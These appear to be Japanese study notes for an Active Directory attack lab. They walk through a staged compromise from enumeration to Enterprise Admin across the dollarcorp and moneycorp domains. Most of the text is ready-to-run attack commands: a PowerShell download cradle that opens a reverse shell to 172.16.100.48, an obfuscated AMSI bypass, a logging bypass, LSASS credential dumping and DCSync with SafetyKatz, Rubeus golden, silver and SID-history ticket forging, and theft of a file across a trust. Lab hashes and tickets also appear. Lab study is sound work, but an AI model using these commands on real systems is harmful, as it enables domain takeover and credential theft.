# 列挙


## SA
```
ipconfig /all
tasklist /v
net user
netstat -anop tcp
nslookup <IP>
```

## AD-Moduleの使用
```
# ADモジュールの.NETアセンブリ(DLL)を読み込み
Import-Module C:\AD\Tools\ADModule-master\Microsoft.ActiveDirectory.Management.dll

# ADモジュールのメインモジュール(マニフェスト)を読み込み。通常のADモジュールと違いオフラインで動作
Import-Module C:\AD\Tools\ADModule-master\ActiveDirectory\ActiveDirectory.psd1
```

### User情報
```
Get-ADUser -Filter * 		

# 大量の情報が出るので見やすくするため以下コマンドを使用
Get-ADUser -Filter * | Select-Object SamAccountName, Enabled, SID	

# 説明も見たいので以下コマンド(properties引数が無い時より細部が表示)

Get-ADUser -Filter * -Properties *	
Get-ADUser -Filter * -Properties * | Select-Object SamAccountName, Enabled, SID, Description
```

### Domain情報
```
Get-ADDomain

Get-ADDomain | Format-List PDCEmulator, DomainSID, DNSRoot, NetBIOSName

# ドメインコントローラー情報
Get-ADDomainController | Select-Object Name, Domain	

# 信頼の方向
Get-ADTrust -Filter * | Select-Object Target, Direction, TrustType	```
```
### Forest情報
```
$forest = Get-ADForest

$forest.Domains

$forest.GlobalCatalogs
```

### Group情報
```bash
Get-ADGroup -Filter * | Select-Object SamAccountName, SID, GroupScope

Get-ADGroupMember -Identity Administrators | Select Name, ObjectClass	

# 以下のエラー発生（カレントドメインはAdminがいるドメインではない）
-----------------------------------------------------------
Get-ADGroupMember : A referral was returned from the server
At line:1 char:1
+ Get-ADGroupMember -Identity Administrators | Select Name, ObjectClass
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : NotSpecified: (Administrators:ADGroup) [Get-ADGroupMember], ADException
    + FullyQualifiedErrorId : ActiveDirectoryServer:8235,Microsoft.ActiveDirectory.Management.Commands.GetADGroupMember
-----------------------------------------------------------
```
```bash
# 次のコマンドは証に失敗してエラーが出る
Get-ADGroupMember -Identity Administrators -Server moneycorp.local | Select Name, ObjectClass	
```

### Computer情報
```
Get-ADComputer -Filter * | Select-Object SamAccountName, Enabled, SID
```

## PowerViewの使用
```bash

# PowerViewを読み込む。PowerViewは攻撃に使われるツールとして有名なのでDefenderで検知・ブロックされる
. C:\AD\Tools\PowerView.ps1	

# AMSI（アンチ・マルウェア・スキャン・インターフェース）をバイパス
C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat	

```

### PowerViewの読込とユーザー情報
```bash
. C:\AD\Tools\PowerView.ps1

# プロパティの複数取り出し不可のためSamAccountNameのみ指定
Get-DomainUser | Select -ExpandProperty SamAccountName	
```


## 書き込み権限の悪用(ここは正直いらない。スキップする)
```bash
# モジュールのインポート
Import-Module C:\AD\Tools\PowerHuntShares.psm1		

# ADMINS$,C$,AIが判明。隠しフォルダでないAIを探す
Invoke-HuntSMBShares -NoPing -OutputDirectory C:\AD\Tools\ -HostList C:\AD\Tools\servers.txt	
```
ブラウザでSMBShareを開きInsecure ACEsを見ればAIフォルダがdcorp-ciにあることが分かる(環境の状態によっては表示されないので注意)


====================================================================
# 権限昇格


## PowerUpの使用

```
C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat

. C:\AD\Tools\PowerUp.ps1

Invoke-AllChecks

```

## WinPeasの使用(コマンドプロンプトで実行)

```bash
C:\AD\Tools\Loader.exe -Path C:\AD\Tools\winPEASx64.exe	  # -args logで出力したoutput.txtで[Weak Services][AlwaysInstallElevated][Unquoted Paths]を検索するのが手っ取り早い


```
## PrivEscCheckの使用

```bash
C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat

. C:\AD\Tools\PrivEscCheck.ps1

Invoke-PrivescCheck			# StatusがVulnerable - Highを探す

```


======================================================================
# ラテラルムーブメント（横移動）

## BloodHoundを使用した分析(P11)LO-1
管理者としてコマンドプロンプト起動
Blood-Hound-win32-x64からBloodHound起動
```bash
C:\AD\Tools\BloodHound-masterollectors\SharpHound.exe --collectionmethods
```
WebUI版で最短経路を確認する。
今回はdcorp-ciから調査する。


## dcorp-ciの調査
```bash

nslookup dcorp-ci

nmap 172.16.3.11 -Pn -sV -T4

nmap 172.16.3.11 -p 8080 -Pn -A -T5	# titleからJenkinsが判明
```
ブラウザでhttp://172.16.3.11:8080にアクセス


## Jenkinsを使用したdcorp-ciへの移動(P39)LO-5

・JenkinsにアクセスしJoeアカウントを調べる
・managerは悪用できそうな部分なし
・builduserはプロジェクトがあり変更可能なので悪用可能
・次のコマンドをセーブする
```bash
# ()内のコマンドをメモリ上で即時実行
powershell.exe iex (iwr http://172.16.100.48/Invoke-PowerShellTcp.ps1 -UseBasicParsing);Power -Reverse -IPAddress 172.16.100.48 -Port 443	

# 以下解説
# iex: Invoke-Expressionのエイリアス。()内をメモリに読み込み。
# iwr: Invoke-WebRequestのエイリアス。Webコンテンツを取得する。
# UseBasicParsing: InternetExplorerを使わずシンプルな読み込み。JSが動くのを防止
# ;はコマンド連結
#  Pdower: Invoke-PowerShellTcp内で定義されたリバースシェル関数。
# Reverse: 標的から攻撃者に接続
# IPAddress: C2サーバー
# Port: 443でHTTPSを偽装しFW回避
```
・HFSを起動しダウンロードさせるファイル(Invoke-PowerShellTcp.ps1)を準備

**netcatについて質問！**
ncについての解説をいれる

・以下のコマンドでnetcatで接続を待ち受け
```bash
C:\AD\Tools\netcat-win32-1.12\nc64.exe -lvp 443
```
・powershellでdcorp-ciセッションが確立される


## dcorp-ciからのdcorp-mgmtアクセス(P48)LO-7

```bash
# Invoke-expressionでPowerView.ps1を実行する。（ただしDefenderでブロックされる）
iex ((New-Object Net.WebClient).DownloadString('http://172.16.100.48/PowerView.ps1'))	
# 上記コマンドの解説
# New-Object:　新しいオブジェクトを作るコマンド(後続のコマンドをインスタンス化)
# Net.WebClient.DownloadString:　WebClient起動しURLから文字列を取得する(PowerViewの中身)
```
AMSI（Anti Malware Scan Interface）をバイパスするため次のどちらかを行う。

① 難読化したコマンド
```bash
S`eT-It`em ( 'V'+'aR' +  'IA' + (("{1}{0}"-f'1','blE:')+'q2')  + ('uZ'+'x')  ) ( [TYpE](  "{1}{0}"-F'F','rE'  ) )  ;    (    Get-varI`A`BLE  ( ('1Q'+'2U')  +'zX'  )  -VaL  )."A`ss`Embly"."GET`TY`Pe"((  "{6}{3}{1}{4}{2}{0}{5}" -f('Uti'+'l'),'A',('Am'+'si'),(("{0}{1}" -f '.M','an')+'age'+'men'+'t.'),('u'+'to'+("{0}{2}{1}" -f 'ma','.','tion')),'s',(("{1}{0}"-f 't','Sys')+'em')  ) )."g`etf`iElD"(  ( "{0}{2}{1}" -f('a'+'msi'),'d',('I'+("{0}{1}" -f 'ni','tF')+("{1}{0}"-f 'ile','a'))  ),(  "{2}{4}{0}{1}{3}" -f ('S'+'tat'),'i',('Non'+("{1}{0}" -f'ubl','P')+'i'),'c','c,'  ))."sE`T`VaLUE"(  ${n`ULl},${t`RuE} )

# 難読化前（元の動作）
# [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
# 初期化チェックのフラグをTrueに強制→起動に失敗と判定→AMSIが一切動作しない
```
② 難読化したコマンドをテキストファイルにし実行
```bash
# 拡張ログ（P/S実行内容を記録する監査ログ）をバイパス(.ps1は検知されるので.txtとして検知回避する。中身はPowerShellスクリプトなのでIEXコマンドで読み込ませて実行する)。PowerShellの内部設定を管理しているメモリに直接アクセスしログ記録のフラグを書き換えている。
iex (iwr http://172.16.100.48/sbloggingbypass.txt -UseBasicParsing)	
```
AMSIのバイパスが完完したら再再コマンドを実行
```bash
iex ((New-Object Net.WebClient).DownloadString('http://172.16.100.48/PowerView.ps1'))
```
ドメイン管理者がいる端末を特定する。
```bash
# どの端末にDAがいるか調べるコマンド。数分かかる
Find-DomainUserLocation		

# winrsが有効か＆コマンド実行の可否を調べる
winrs -r:dcorp-mgmt cmd /c "set computername && set username"	
```
dcorp-mgmtにアクセス完了

## dcorp-mgmtからクレデンシャル窃取(P49)LO-7

```bash

# Loader.exeをダウンロード。Loader.exeはローダー実行ファイル
iwr http://172.16.100.48/Loader.exe -OutFile C:\Users\Public\Loader.exe		

# Loader.exeをターゲット(dcorp-mgmt)に配送.echo Fは上書き確認に対する自動応答。sudo apt install hoge -Yと同じようなもの。-Fはファイルとして保存。-Dはフォルダとして保存
echo F | xcopy C:\Users\Public\Loader.exe \\dcorp-mgmt\C$\Users\Public\Loader.exe	
# $nullは外部コマンド実行時の起動バナー等不要表示を出力しないようにするためにつけている。
# 先頭が\\ならUNC（リモートサーバ）、\なら現在のドライブのルート、C:ならローカルの絶対パスを示している。
# C$は隠しディレクトリ。C$はWindows標準の隠し管理共有で管理者権限でのみアクセスできる。用途はリモート管理専用

$null | winrs -r:dcorp-mgmt "netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=172.16.100.48"	

# SafetyKatzスクリプトをロードしメモリ上で実行。LSASSからKeroberos復号キー取得
$null | winrs -r:dcorp-mgmt "cmd /c C:\Users\Public\Loader.exe -path http://127.0.0.1:8080/SafetyKatz.exe sekurlsa::evasive-keys exit"	

```
svcadminのAES256ハッシュを取得

## クレデンシャルを使用しdcorp-dcにアクセス

新しいコマンドプロンプトを開始
```bash
# RubeusはKeroberouｓ認証を悪用して権限昇格や横展開を行うツール
C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args asktgt /user:svcadmin /aes256:6366243a657a4ea04e406f1abc27f1ada358ccd0138ec5ca2835067719dc7011 /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
# -args asktgt はKeroberosのTGTを要求するコマンド
# /ptt　はPass The Ticketオプションで、取得したTGTをプロセスのセッションにインポートする
```
管理者権限が必要と怒られるので管理者で実行する
新しいプロンプト画面が表示される
```bash
winrs -r:dcorp-dc cmd /c set username USERNAME=svcadmin
```
※ 何も表示されない場合コマンド実行は成功しているが表示に不具合がある
```bash
# cmdで接続できることを確認
winrs -r:dcorp-dc
# 見事DCまで侵入できた。

# 自分がドメイン管理者なのか調べたい時は次のコマンドを実行
whoami /groups | findstr "Domain Admins"
```


===============================================================================
# 永続化


## 秘密の抽出(P62)LO-8

管理者としてコマンドプロンプトを起動
```bash
C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args asktgt /user:svcadmin /aes256:6366243a657a4ea04e406f1abc27f1ada358ccd0138ec5ca2835067719dc7011 /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt	
# DA権限を持つプロンプトが起動

# Loaderをdcに配置
echo F | xcopy C:\AD\Tools\Loader.exe \\dcorp-dc\C$\Users\Public\Loader.exe /Y	

# dcに接続
winrs -r:dcorp-dc cmd		
netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=172.16.100.48	# ポートフォワード設定

C:\Users\Public\Loader.exe --obfuscate false -path http://127.0.0.1:8080/SafetyKatz.exe -args "lsadump::evasive-lsa /patch" "exit"	
# 文字化けが発生するときはHFSを起動していないか学生VMのファイアーウォールがONになっている。

```
・秘密情報を入手
　悪用シナリオ
1. 他端末の認証に使用（pass the hash） 
2. NTLMリレー　
3. パスワードクラック（John）


## ゴールデンチケット攻撃(P63)LO-8
・DA権限を持つプロンプトに移動
```bash

# DCSync攻撃(DCの正規レプリケーション(複製)機能を悪用しパスワードハッシュを抽出)でkrbtgtのハッシュを取得
# レプリケーション機能はDC間でオブジェクトや属性などの情報を同期させフォレスト内の全DCで最新の状態を維持する仕組み
C:\AD\Tools\Loader.exe -path C:\AD\Tools\SafetyKatz.exe -args "lsadump::evasive-dcsync /user:dcorp\krbtgt" "exit"		

# ゴールデンチケット偽装（AES256は直前のDCSyncで入手）※変な表示が出るときは再ログインする（チケットが多すぎることによるエラー）
# ゴールデンチケットはあらゆるユーザーになりすましができる偽装チケット
C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args evasive-golden /aes256:154cb6624b1d859f7080a6615adc488f09f92843879b3d914cbcb5a8c3cda848 /sid:S-1-5-21-719815819-3726368948-3917688648 /ldap /user:Administrator /printcmd	

# 表示されたコマンドに-path C:\AD\Tools\Rubeus.exe -argsと/pttを追記している
C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args Evasive-Golden /aes256:154CB6624B1D859F7080A6615ADC488F09F92843879B3D914CBCB5A8C3CDA848 /user:Administrator /id:500 /pgid:513 /domain:dollarcorp.moneycorp.local AlteredSecurity Attacking and Defending Active Directory 65 /sid:S-1-5-21-719815819-3726368948-3917688648 /pwdlastset:"11/11/2022 6:34:22 AM" /minpassage:1 /logoncount:152 /netbios:dcorp /groups:544,512,520,513 /dc:DCORP-DC.dollarcorp.moneycorp.local /uac:NORMAL_ACCOUNT,DONT_EXPIRE_PASSWORD /ptt	winrs -r:dcorp-dc cmd

set username

set computername

```


## その他の永続化として以下のようなものがある。
## シルバーチケット攻撃
TGSを偽装する攻撃。そのハッシュを持つ特定のサービスに対してのみ有効
DCと通信しないためログに残らない。対してゴールデンチケットはDC側でTGS要求履歴が残るのに対応するTGT発行ログがない不自然なログが記録される。
## ダイアモンドチケット攻撃
ダイアモンドチケットは正規のTGTを復号し内容を改ざんしたあと再暗号化したもの。正規プロセスにより発行され、時間が正確でログに不自然なギャップがないため検知が難しい。
## スケルトンキーを使った永続化(検知されやすい上、AD証明書サービスに問問を引き起こす可能性がある)
DCのLSASSプロセスにパッチを当てることであらゆるユーザーでログインできるようになる。実行にはDA権限が必要。メモリに存在するためDCが再起動すると効果が失われる
## エージェント型ならスケジュールタスク、レジストリ実行キー、スタートアップフォルダ、COMオブジェクト(部品のように使えるプログラムの塊)がある。


================================================================================
# ドメイン権限昇格(EnterpriseAdmin)


## DomainTrustKeyを使用した権限昇格（P97）LO-18

(DA権限を持つプロンプトが起動していれば以下コマンドは省略可能)
```bash
C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args asktgt /user:svcadmin /aes256:6366243a657a4ea04e406f1abc27f1ada358ccd0138ec5ca2835067719dc7011 /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
```
・新しいプロンプトが開く
```bash

# Loaderを配置
echo F | xcopy C:\AD\Tools\Loader.exe \\dcorp-dc\C$\Users\Public\Loader.exe /Y		
# DCに接続
winrs -r:dcorp-dc cmd	

# ポートフォワード追加
netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=172.16.100.48	

# rc4のハッシュを取得
C:\Users\Public\Loader.exe -path http://127.0.0.1:8080/SafetyKatz.exe -args "lsadump::evasive-trust /patch" "exit"		
# -args lsadump::evasive-trustはDCからドメイン間の信頼キーを抽出するコマンド(evasiveは検知回避のための難読化されたmimikatzのコマンド)
```
新しいコマンドプロンプト画面を起動する
```bash

# SIDヒストリを含むチケットを作成
C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args evasive-silver /service:krbtgt/DOLLARCORP.MONEYCORP.LOCAL /rc4:bf829c994cc5f43fcbc870c9654bc9d5 /sid:S-1-5-21-719815819-3726368948-3917688648 /sids:S-1-5-21-335606122-960912869-3279953914-519 /ldap /user:Administrator /nowrap	
# sidは現在のドメインのSID。DCsyncやlsadump:: /patchの出力結果でわかる他、Get-DomainSID(PowerView)や(Get-ADDomain).DomainSIDで取得可能
# sidsは追加するSIDで親ドメインの特権グループを使う。lsadump::evasive-trust /patchコマンドで親ドメインのSIDを確認し、末尾に特定グループのRID(Enterprise Adminなら519)を組み合わせることで作成


# 先ほどのコマンドで出力されたチケットを使用する。
C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args asktgs /service:http/mcorp-dc.MONEYCORP.LOCAL /dc:mcorp-dc.MONEYCORP.LOCAL /ptt /ticket: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		
# 使用しているRC4に間違いがないのにKRBERROR(31)が発生する場合はメールする。

winrs -r:mcorp-dc.moneycorp.local cmd

set username

set computername
# EnterpriseAdmin権限を掌握
```
ドメインコントローラへのアクセスが完了！

## krbtgtハッシュ（RC4）を使用した権限昇格（P100）LO-19

(DA権限を持つプロンプトが起動していれば以下コマンドは省略可能.AES256ハッシュはDCSync攻撃で入手)

```bash
C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args evasive-golden /user:Administrator /id:500 /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-719815819-3726368948-3917688648 /sids:S-1-5-21-335606122-960912869-3279953914-519 /aes256:154cb6624b1d859f7080a6615adc488f09f92843879b3d914cbcb5a8c3cda848 /netbios:dcorp /ptt

winrs -r:mcorp-dc.moneycorp.local cmd

set username

set computername
# EnterpriesAdmin権限を掌握
```
ドメインコントローラへのアクセスが完了！

追加でDCSync攻撃をする場合は以下のコマンド
```bash
C:\AD\Tools\Loader.exe -path C:\AD\Tools\SafetyKatz.exe -args "lsadump::evasive-dcsync /user:mcorp\krbtgt /domain:moneycorp.local" "exit"

# 全ハッシュ入手！

```

## 外部信頼を悪用し共有リソースにアクセス(P101)LO-20

管理者権限でコマンドプロンプトを起動
(DA権限を持つプロンプトが起動していれば以下コマンドは省略可能)
```bash
C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args asktgt /user:svcadmin /aes256:6366243a657a4ea04e406f1abc27f1ada358ccd0138ec5ca2835067719dc7011 /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt


echo F | xcopy C:\AD\Tools\Loader.exe \\dcorp-dc\C$\Users\Public\Loader.exe /Y

winrs -r:dcorp-dc cmd

netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=172.16.100.48

C:\Users\Public\Loader.exe -path http://127.0.0.1:8080/SafetyKatz.exe -args "lsadump::evasive-trust /patch" "exit"

C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args evasive-silver /service:krbtgt/DOLLARCORP.MONEYCORP.LOCAL /rc4:5c83b026f7591aec55034cb8bd50b496 /sid:S-1-5-21-719815819-3726368948-3917688648 /ldap /user:Administrator /nowrap

C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args asktgs /service:cifs/eurocorp-dc.eurocorp.LOCAL /dc:eurocorp-dc.eurocorp.LOCAL /ptt /ticket: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		
# 使用しているRC4に間違いがないのにKRBERROR(31)が発生する場合はメールする。

# 外部信頼ドメインの共有リソースにアクセス
dir \\eurocorp-dc.eurocorp.local\SharedwithDCorp\	

# secret.txtの情報窃取
type \\eurocorp-dc.eurocorp.local\SharedwithDCorp\secret.txt	
```
